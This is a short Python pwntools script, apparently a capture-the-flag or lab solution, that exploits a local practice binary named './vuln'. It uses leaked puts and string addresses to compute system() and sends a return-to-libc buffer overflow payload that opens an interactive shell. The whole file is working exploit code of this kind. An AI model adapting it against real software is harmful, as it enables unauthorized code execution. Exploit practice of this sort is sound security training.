#! /usr/bin/python

from pwn import *
import re


context.terminal = ["terminator", "-e"]

# https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/
overflow_offset = 160

"""
Manual evaluation with GDB to get the system() address: 
gdb > break main
gdb > run
gdb > p system
0xf7e31da0
gdb > p puts
0xf7e56ca0
Now we need to compute the offset to the rest of the addresses leaked. 
"""
system_offset = 0xf7e56ca0 - 0xf7e31da0 

p = process("./vuln")
leak = p.recvuntil("a string:\n")

puts_addr = int(re.findall(r"puts: (.*)", leak)[0], 16)
useful_str_addr = int(re.findall(r"useful_string: (.*)", leak)[0], 16)

# debug
# print "------------------------------------------------------------------------------------"
system_addr = puts_addr - system_offset
# print "puts addr", hex(puts_addr), "\nuseful string addr", hex(useful_str_addr), "\nsystem addr", hex(system_addr)
# print "------------------------------------------------------------------------------------"

eip = p32(system_addr)
# PAYOAD: AAAAAAAAAA + system_addr + JUNK + system_argument
#  the JUNK is for the next 4 bytes after the ESP is read (before the function arguments)
payload = "A" * overflow_offset + eip + "JUNK" + p32(useful_str_addr)

p.sendline(payload)
p.interactive()
